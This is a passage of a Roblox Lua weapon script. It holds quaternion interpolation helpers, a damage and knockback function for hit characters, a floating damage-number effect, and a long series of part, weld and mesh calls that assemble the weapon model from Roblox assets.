local qa = {QuaternionFromCFrame(a)}
local qb = {QuaternionFromCFrame(b)} 
local ax, ay, az = a.x, a.y, a.z 
local bx, by, bz = b.x, b.y, b.z
local _t = 1-t
return QuaternionToCFrame(_t*ax + t*bx, _t*ay + t*by, _t*az + t*bz,QuaternionSlerp(qa, qb, t)) 
end 
 
function QuaternionFromCFrame(cf) 
local mx, my, mz, m00, m01, m02, m10, m11, m12, m20, m21, m22 = cf:components() 
local trace = m00 + m11 + m22 
if trace > 0 then 
local s = math.sqrt(1 + trace) 
local recip = 0.5/s 
return (m21-m12)*recip, (m02-m20)*recip, (m10-m01)*recip, s*0.5 
else 
local i = 0 
if m11 > m00 then
i = 1
end
if m22 > (i == 0 and m00 or m11) then 
i = 2 
end 
if i == 0 then 
local s = math.sqrt(m00-m11-m22+1) 
local recip = 0.5/s 
return 0.5*s, (m10+m01)*recip, (m20+m02)*recip, (m21-m12)*recip 
elseif i == 1 then 
local s = math.sqrt(m11-m22-m00+1) 
local recip = 0.5/s 
return (m01+m10)*recip, 0.5*s, (m21+m12)*recip, (m02-m20)*recip 
elseif i == 2 then 
local s = math.sqrt(m22-m00-m11+1) 
local recip = 0.5/s return (m02+m20)*recip, (m12+m21)*recip, 0.5*s, (m10-m01)*recip 
end 
end 
end
 
function QuaternionToCFrame(px, py, pz, x, y, z, w) 
local xs, ys, zs = x + x, y + y, z + z 
local wx, wy, wz = w*xs, w*ys, w*zs 
local xx = x*xs 
local xy = x*ys 
local xz = x*zs 
local yy = y*ys 
local yz = y*zs 
local zz = z*zs 
return CFrame.new(px, py, pz,1-(yy+zz), xy - wz, xz + wy,xy + wz, 1-(xx+zz), yz - wx, xz - wy, yz + wx, 1-(xx+yy)) 
end
 
function QuaternionSlerp(a, b, t) 
local cosTheta = a[1]*b[1] + a[2]*b[2] + a[3]*b[3] + a[4]*b[4] 
local startInterp, finishInterp; 
if cosTheta >= 0.0001 then 
if (1 - cosTheta) > 0.0001 then 
local theta = math.acos(cosTheta) 
local invSinTheta = 1/math.sin(theta) 
startInterp = math.sin((1-t)*theta)*invSinTheta 
finishInterp = math.sin(t*theta)*invSinTheta  
else 
startInterp = 1-t 
finishInterp = t 
end 
else 
if (1+cosTheta) > 0.0001 then 
local theta = math.acos(-cosTheta) 
local invSinTheta = 1/math.sin(theta) 
startInterp = math.sin((t-1)*theta)*invSinTheta 
finishInterp = math.sin(t*theta)*invSinTheta 
else 
startInterp = t-1 
finishInterp = t 
end 
end 
return a[1]*startInterp + b[1]*finishInterp, a[2]*startInterp + b[2]*finishInterp, a[3]*startInterp + b[3]*finishInterp, a[4]*startInterp + b[4]*finishInterp 
end


--Example: Torso.Weld.C0 = clerp(Torso.Weld.C0, CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0)), 0.4)


function rayCast(Pos, Dir, Max, Ignore)  -- Origin Position , Direction, MaxDistance , IgnoreDescendants
return game:service("Workspace"):FindPartOnRay(Ray.new(Pos, Dir.unit * (Max or 999.999)), Ignore) 
end 

Damagefunc=function(hit,minim,maxim,knockback,Type,Property,Delay,KnockbackType,decreaseblock)
        if hit.Parent==nil then
                return
        end
        local h=hit.Parent:FindFirstChild("Humanoid")
        for _,v in pairs(hit.Parent:children()) do
        if v:IsA("Humanoid") then
        h=v
        end
        end
        if hit.Parent.Parent:FindFirstChild("Torso")~=nil then
        h=hit.Parent.Parent:FindFirstChild("Humanoid")
        end
        if hit.Parent.className=="Hat" then
        hit=hit.Parent.Parent:findFirstChild("Head")
        end
        if h~=nil and hit.Parent.Name~=Character.Name and hit.Parent:FindFirstChild("Torso")~=nil then
        if hit.Parent:findFirstChild("DebounceHit")~=nil then if hit.Parent.DebounceHit.Value==true then return end end
        --[[                if game.Players:GetPlayerFromCharacter(hit.Parent)~=nil then
                        return
                end]]
--                        hs(hit,1.2) 
                        local c=Instance.new("ObjectValue")
                        c.Name="creator"
                        c.Value=game:service("Players").LocalPlayer
                        c.Parent=h
                        game:GetService("Debris"):AddItem(c,.5)
                local Damage=math.random(minim,maxim)
--                h:TakeDamage(Damage)
                local blocked=false
                local block=hit.Parent:findFirstChild("Block")
                if block~=nil then
                print(block.className)
                if block.className=="NumberValue" then
                if block.Value>0 then
                blocked=true
                if decreaseblock==nil then
                block.Value=block.Value-1
                end
                end
                end
                if block.className=="IntValue" then
                if block.Value>0 then
                blocked=true
                if decreaseblock~=nil then
                block.Value=block.Value-1
                end
                end
                end
                end
                if blocked==false then
--                h:TakeDamage(Damage)
                h.Health=h.Health-Damage
                ShowDamage((Hitbox.CFrame * CFrame.new(0, 0, (Part.Size.Z / 2)).p + Vector3.new(0, 1.5, 0)), -Damage, 1.5, Hitbox.BrickColor.Color)
                else
                h.Health=h.Health-(Damage/2)
                ShowDamage((Hitbox.CFrame * CFrame.new(0, 0, (Part.Size.Z / 2)).p + Vector3.new(0, 1.5, 0)), -Damage, 1.5, BrickColor.new("Bright blue").Color)
                end
                if Type=="Knockdown" then
                local hum=hit.Parent.Humanoid
hum.PlatformStand=true
coroutine.resume(coroutine.create(function(HHumanoid)
swait(1)
HHumanoid.PlatformStand=false
end),hum)
                local angle=(hit.Position-(Property.Position+Vector3.new(0,0,0))).unit
--hit.CFrame=CFrame.new(hit.Position,Vector3.new(angle.x,hit.Position.y,angle.z))*CFrame.fromEulerAnglesXYZ(math.pi/4,0,0)
local bodvol=Instance.new("BodyVelocity")
bodvol.velocity=angle*knockback
bodvol.P=5000
bodvol.maxForce=Vector3.new(8e+003, 8e+003, 8e+003)
bodvol.Parent=hit
local rl=Instance.new("BodyAngularVelocity")
rl.P=3000
rl.maxTorque=Vector3.new(500000,500000,500000)*50000000000000
rl.angularvelocity=Vector3.new(math.random(-10,10),math.random(-10,10),math.random(-10,10))
rl.Parent=hit
game:GetService("Debris"):AddItem(bodvol,.5)
game:GetService("Debris"):AddItem(rl,.5)
                elseif Type=="Normal" then
                local vp=Instance.new("BodyVelocity")
                vp.P=500
                vp.maxForce=Vector3.new(math.huge,0,math.huge)
--                vp.velocity=Character.Torso.CFrame.lookVector*Knockback
                if KnockbackType==1 then
                vp.velocity=Property.CFrame.lookVector*knockback+Property.Velocity/1.05
                elseif KnockbackType==2 then
                vp.velocity=Property.CFrame.lookVector*knockback
                end
                if knockback>0 then
                        vp.Parent=hit.Parent.Torso
                end
                game:GetService("Debris"):AddItem(vp,.5)
                elseif Type=="Up" then
                local bodyVelocity=Instance.new("BodyVelocity")
                bodyVelocity.velocity=vt(0,60,0)
                bodyVelocity.P=5000
                bodyVelocity.maxForce=Vector3.new(8e+003, 8e+003, 8e+003)
                bodyVelocity.Parent=hit
                game:GetService("Debris"):AddItem(bodyVelocity,1)
                local rl=Instance.new("BodyAngularVelocity")
                rl.P=3000
                rl.maxTorque=Vector3.new(500000,500000,500000)*50000000000000
                rl.angularvelocity=Vector3.new(math.random(-30,30),math.random(-30,30),math.random(-30,30))
                rl.Parent=hit
                game:GetService("Debris"):AddItem(rl,.5)
                elseif Type=="Snare" then
                local bp=Instance.new("BodyPosition")
                bp.P=2000
                bp.D=100
                bp.maxForce=Vector3.new(math.huge,math.huge,math.huge)
                bp.position=hit.Parent.Torso.Position
                bp.Parent=hit.Parent.Torso
                game:GetService("Debris"):AddItem(bp,1)
                elseif Type=="Target" then
	            local Targetting = false
                if Targetting==false then
                ZTarget=hit.Parent.Torso
                coroutine.resume(coroutine.create(function(Part) 
                so("http://www.roblox.com/asset/?id=15666462",Part,1,1.5) 
                swait(5)
                so("http://www.roblox.com/asset/?id=15666462",Part,1,1.5) 
                end),ZTarget)
                local TargHum=ZTarget.Parent:findFirstChild("Humanoid")
                local  targetgui=Instance.new("BillboardGui")
                targetgui.Parent=ZTarget
                targetgui.Size=UDim2.new(10,100,10,100)
                local targ=Instance.new("ImageLabel")
                targ.Parent=targetgui
                targ.BackgroundTransparency=1
                targ.Image="rbxassetid://4834067"
                targ.Size=UDim2.new(1,0,1,0)
                cam.CameraType="Scriptable"
                cam.CoordinateFrame=CFrame.new(Head.CFrame.p,ZTarget.Position)
                local dir=Vector3.new(cam.CoordinateFrame.lookVector.x,0,cam.CoordinateFrame.lookVector.z)
                workspace.CurrentCamera.CoordinateFrame=CFrame.new(Head.CFrame.p,ZTarget.Position)
                Targetting=true
                RocketTarget=ZTarget
                for i=1,Property do
                --while Targetting==true and Humanoid.Health>0 and Character.Parent~=nil do
                if Humanoid.Health>0 and Character.Parent~=nil and TargHum.Health>0 and TargHum.Parent~=nil and Targetting==true then
                swait()
                end
                --workspace.CurrentCamera.CoordinateFrame=CFrame.new(Head.CFrame.p,Head.CFrame.p+rmdir*100)
                cam.CoordinateFrame=CFrame.new(Head.CFrame.p,ZTarget.Position)
                dir=Vector3.new(cam.CoordinateFrame.lookVector.x,0,cam.CoordinateFrame.lookVector.z)
                cam.CoordinateFrame=CFrame.new(Head.CFrame.p,ZTarget.Position)*cf(0,5,10)*euler(-0.3,0,0)
                end
                Targetting=false
                RocketTarget=nil
                targetgui.Parent=nil
                cam.CameraType="Custom"
                end
                end
                        local debounce=Instance.new("BoolValue")
                        debounce.Name="DebounceHit"
                        debounce.Parent=hit.Parent
                        debounce.Value=true
                        game:GetService("Debris"):AddItem(debounce,Delay)
                        c=Instance.new("ObjectValue")
                        c.Name="creator"
                        c.Value=Player
                        c.Parent=h
                        game:GetService("Debris"):AddItem(c,.5)
        end
end


function ShowDamage(Pos, Text, Time, Color)
	local Rate = (1 / 30)
	local Pos = (Pos or Vector3.new(0, 0, 0))
	local Text = (Text or "")
	local Time = (Time or 2)
	local Color = (Color or Color3.new(1, 0, 0))
	local EffectPart = part("Custom",workspace,"SmoothPlastic",0,1,BrickColor.new(Color),"Effect",vt(0,0,0))
	EffectPart.Anchored = true
	local BillboardGui = Instance.new("BillboardGui")
	BillboardGui.Size = UDim2.new(3, 0, 3, 0)
	BillboardGui.Adornee = EffectPart
	local TextLabel = Instance.new("TextLabel")
	TextLabel.BackgroundTransparency = 1
	TextLabel.Size = UDim2.new(1, 0, 1, 0)
	TextLabel.Text = Text
	TextLabel.TextColor3 = Color
	TextLabel.TextScaled = true
	TextLabel.Font = Enum.Font.ArialBold
	TextLabel.Parent = BillboardGui
	BillboardGui.Parent = EffectPart
	game.Debris:AddItem(EffectPart, (Time + 0.1))
	EffectPart.Parent = game:GetService("Workspace")
	Delay(0, function()
		local Frames = (Time / Rate)
		for Frame = 1, Frames do
			wait(Rate)
			local Percent = (Frame / Frames)
			EffectPart.CFrame = CFrame.new(Pos) + Vector3.new(0, Percent, 0)
			TextLabel.TextTransparency = Percent
		end
		if EffectPart and EffectPart.Parent then
			EffectPart:Destroy()
		end
	end)
end

handle=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Handle",Vector3.new(0.800000012, 3.5999999, 0.800000012))
handleweld=weld(m,Character["Right Arm"],handle,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.00978088379, 0.656887054, 1.14379132, -0.999998093, 0.00253854319, -2.98064613e-008, -2.98062979e-008, 8.94229968e-011, 1, 0.00253850338, 0.999997973, -1.37580555e-011))
mesh("CylinderMesh",handle,"","",Vector3.new(0, 0, 0),Vector3.new(1, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.799999952, 0.800000012, 0.399999976))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(2.2951355, -2.29264069, 2.06851101, -0.70664072, 0.683012187, 0.184808537, -0.707570016, -0.683011293, -0.181221515, 0.00244987407, -0.258822918, 0.965922773))
mesh("SpecialMesh",Part,Enum.MeshType.FileMesh,"http://www.roblox.com/Asset/?id=9756362",Vector3.new(0, 0, 0),Vector3.new(0.80400002, 0.800000012, 1.36199999))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.980000019, 0.400000006, 0.829999983))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.0090675354, -0.399864197, -0.00609540939, 0.999998093, -9.84101689e-013, -0.00253850338, 7.63833441e-013, 1, -8.94248287e-011, 0.00253854343, 8.94238988e-011, 0.999998093))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(1, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Navy blue","Part",Vector3.new(0.200000003, 0.400000006, 0.400000036))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.00175476074, -0.668507576, 3.84399414, 0.999991536, 1.10027628e-007, -0.00253868476, -0.00245218934, 0.258818686, -0.965922773, 0.000656952092, 0.965919077, 0.258819729))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.328000009, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Navy blue","Part",Vector3.new(0.819999993, 0.200000003, 0.200000018))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.00177383423, 0.301001668, 3.09999084, 0.999991536, -1.4007054e-006, -0.00253856136, -0.0025384964, -1.49101027e-007, -0.999997199, 1.40017289e-006, 0.999993384, -2.12260886e-007))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(1, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.799999952, 0.800000012, 0.399999976))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(2.25549316, -2.25797272, 1.87240982, 0.706640601, 0.683012187, -0.184808478, 0.707569897, -0.683011293, 0.181221485, -0.00244979863, -0.258822918, -0.965922713))
mesh("SpecialMesh",Part,Enum.MeshType.FileMesh,"http://www.roblox.com/Asset/?id=9756362",Vector3.new(0, 0, 0),Vector3.new(0.80400002, 0.800000012, 1.36199999))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Navy blue","Part",Vector3.new(0.819999993, 0.399999917, 1.5999999))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.00175476074, -3.19146729, -1.07241821, -0.999997497, 6.7068413e-009, 0.00253847218, 0.000657052209, -0.965925395, 0.258818537, 0.00245200517, 0.258818954, 0.96592319))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.980000019, 0.400000006, 0.829999983))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.0090675354, 0.40007019, -0.00609540939, 0.999997973, -9.84101689e-013, -0.00253850315, 7.63833441e-013, 0.999999881, -8.94248148e-011, 0.00253854343, 8.94238988e-011, 0.999998093))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(1, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.400000006, 0.599999905, 0.800000012))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.0086517334, 2.09998322, 0.000371813774, 1.00000322, 1.17150734e-011, 0.000686014537, -1.1713297e-011, 1, 2.41529869e-011, -0.000685904175, -2.41570861e-011, 1.00000322))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(1, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Navy blue","Part",Vector3.new(0.819999993, 0.200000003, 0.200000018))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.00177383423, 0.30100286, -2.90000153, -0.999991417, 1.32619959e-006, 0.00253841188, -0.0025385858, 1.4892214e-007, -0.999997199, -1.31182526e-006, -0.999993265, -2.05197622e-007))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(1, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Navy blue","Part",Vector3.new(0.819999993, 0.399999917, 1.5999999))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.00177001953, -3.24401093, -1.26851368, 0.999997735, 6.63194086e-008, -0.00253853458, -0.000656968332, -0.965925395, -0.258818537, -0.00245199562, 0.258818954, -0.965923369))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Navy blue","Part",Vector3.new(0.799999952, 0.800000012, 0.400000036))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(3.24404907, 0.00176620483, 2.06851101, 0.000657034281, 0.965924621, 0.258822441, -0.999997914, 7.07726201e-007, 0.00253604189, 0.0024494431, -0.258823037, 0.965922832))
mesh("SpecialMesh",Part,Enum.MeshType.FileMesh,"http://www.roblox.com/Asset/?id=9756362",Vector3.new(0, 0, 0),Vector3.new(0.616000056, 0.593999982, 1.36199999))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Navy blue","Part",Vector3.new(0.200000003, 0.400000036, 0.400000036))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.00175476074, -1.86851025, 3.84400558, 0.999991536, 1.10027628e-007, -0.00253868476, -0.00245218934, 0.258818686, -0.965922773, 0.000656952092, 0.965919077, 0.258819729))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.328000009, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Navy blue","Part",Vector3.new(0.200000003, 0.400000036, 0.400000036))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.00175476074, -1.26852417, 3.84400177, 0.999991536, 1.10027628e-007, -0.00253868476, -0.00245218934, 0.258818686, -0.965922773, 0.000656952092, 0.965919077, 0.258819729))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.328000009, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.800000012, 0.799999893, 1.5999999))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.00177001953, -3.24401093, -1.26851368, 0.999997735, 6.63194086e-008, -0.00253853458, -0.000656968332, -0.965925395, -0.258818537, -0.00245199562, 0.258818954, -0.965923369))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.800000012, 0.799999893, 2.5999999))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.000328063965, 2.99998474, 0.100373149, 1.00000119, 1.03472786e-011, 0.000678057317, -1.03561604e-011, 1, 2.38740295e-011, -0.00067801727, -2.38796205e-011, 1.00000119))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.800000012, 0.200000003, 1.20000005))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.000255584717, 3.49998474, 0.000342130661, 1.00000119, 1.03490549e-011, 0.000589797972, -1.03561604e-011, 1, 2.07657936e-011, -0.000589757925, -2.07704687e-011, 1.00000119))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(1, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Navy blue","Part",Vector3.new(0.200000003, 0.400000036, 0.400000095))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.00175476074, -0.668564796, -2.64397049, -0.999991536, 1.49007832e-007, 0.00253771944, -0.00245122844, 0.258800924, -0.96592766, -0.000656907854, -0.965923607, -0.258801997))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.328000009, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0.19999998807907,"Navy blue","Part",Vector3.new(0.800000012, 0.599999905, 0.800000012))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.000328063965, 2.09998322, 0.0003708601, 1.00000358, 1.03526077e-011, 0.000683508348, -1.03490549e-011, 1, 2.40659801e-011, -0.000683391467, -2.40689066e-011, 1.00000358))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(1, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.400000006, 0.800000012, 0.800000072))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.00101470947, 1.50983429, 0.000193715096, 1.00000095, 2.98064009e-008, -0.000846923911, 2.98064471e-008, -1, 4.59674659e-012, -0.000846963958, -2.9841872e-011, -1.00000095))
mesh("SpecialMesh",Part,Enum.MeshType.FileMesh,"http://www.roblox.com/asset/?id=1778999",Vector3.new(0, 0, 0),Vector3.new(0.940000057, 1.43400002, 0.988000035))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Navy blue","Part",Vector3.new(0.910000026, 1.5999999, 0.819999993))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.00496673584, 0.000102996826, -0.00546550751, 0.999998093, -9.84101689e-013, -0.00253850338, 7.63833441e-013, 1, -8.94248287e-011, 0.00253854343, 8.94238988e-011, 0.999998093))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(1, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Navy blue","Part",Vector3.new(0.819999993, 0.200000003, 0.200000018))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.00176620483, 0.299010992, 3.09999084, -0.999991536, -1.46031755e-006, 0.00253854645, 0.00253852643, -1.48922183e-007, 0.999997258, -1.45978549e-006, 0.999993384, 2.12233388e-007))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(1, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Navy blue","Part",Vector3.new(0.400000006, 0.400000036, 0.800000072))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.00101470947, -3.79997253, 0.000193715096, 1.00000095, 2.98064009e-008, -0.000846923911, 2.98064471e-008, -1, 4.59674659e-012, -0.000846963958, -2.9841872e-011, -1.00000095))
mesh("SpecialMesh",Part,Enum.MeshType.FileMesh,"http://www.roblox.com/asset/?id=1778999",Vector3.new(0, 0, 0),Vector3.new(0.60800004, 0.241999984, 0.606000006))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Navy blue","Part",Vector3.new(0.800000012, 0.200000003, 0.800000012))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.00032043457, 2.49998474, 0.000371456146, 1.00000381, 1.03526077e-011, 0.00068351021, -1.03490549e-011, 1, 2.40660495e-011, -0.00068339007, -2.40688372e-011, 1.00000381))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(1, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Navy blue","Part",Vector3.new(0.600000024, 0.200000003, 1.20000005))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.0102539063, 3.50998306, 0.000287055969, 1.00000119, 1.03490549e-011, 0.000534346327, -1.03526077e-011, 1, 1.88129321e-011, -0.00053430628, -1.88170521e-011, 1.00000119))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(1, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Navy blue","Part",Vector3.new(0.819999993, 0.399999917, 0.799999893))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.00184249878, 2.99998856, -0.801000834, 0.999998212, -9.80548975e-013, -0.00248575397, 7.67386155e-013, 1, -8.7567141e-011, 0.00248579402, 8.75662667e-011, 0.999998212))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Navy blue","Part",Vector3.new(0.819999993, 0.399999917, 0.999999881))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.00172424316, 2.99998856, 0.899011493, 0.999998152, -9.80548975e-013, -0.00250685378, 7.67386155e-013, 1, -8.83102202e-011, 0.00250689383, 8.83093182e-011, 0.999998152))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Navy blue","Part",Vector3.new(0.200000003, 0.399999976, 0.400000095))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.00175476074, -1.86856842, -2.64398575, -0.999991536, 1.49007832e-007, 0.00253771944, -0.00245122844, 0.258800924, -0.96592766, -0.000656907854, -0.965923607, -0.258801997))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.328000009, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Navy blue","Part",Vector3.new(0.200000003, 0.400000036, 0.400000095))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.00175476074, -1.26854801, -2.64397812, -0.999991536, 1.49007832e-007, 0.00253771944, -0.00245122844, 0.258800924, -0.96592766, -0.000656907854, -0.965923607, -0.258801997))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.328000009, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Navy blue","Part",Vector3.new(0.910000026, 0.200000003, 0.819999993))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.00489807129, -1.69981766, -0.0052703619, 0.999998152, 1.39959155e-011, -0.00251095998, -1.42090784e-011, 1, -8.84208123e-011, 0.00251100003, 8.84575052e-011, 0.999998152))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(1, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Navy blue","Part",Vector3.new(0.819999993, 0.200000003, 0.200000018))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.00176620483, 0.299011946, -2.90000153, 0.999991536, 1.4007129e-006, -0.00253842724, 0.00253855623, 1.49100984e-007, 0.999997258, 1.3565367e-006, -0.999993265, 2.05262978e-007))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(1, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Navy blue","Part",Vector3.new(0.200000003, 0.400000036, 0.400000095))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.00175857544, -0.472471237, -2.59142685, 0.999991477, 2.08620037e-007, -0.00253769686, 0.00245122635, 0.258800924, 0.965927482, 0.000656995224, -0.965923607, 0.258801967))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.328000009, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.800000012, 0.799999893, 1.5999999))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.00177001953, -3.19146729, -1.07242203, -0.999997497, 6.7068413e-009, 0.00253847218, 0.000657052209, -0.965925395, 0.258818537, 0.00245200517, 0.258818954, 0.96592319))
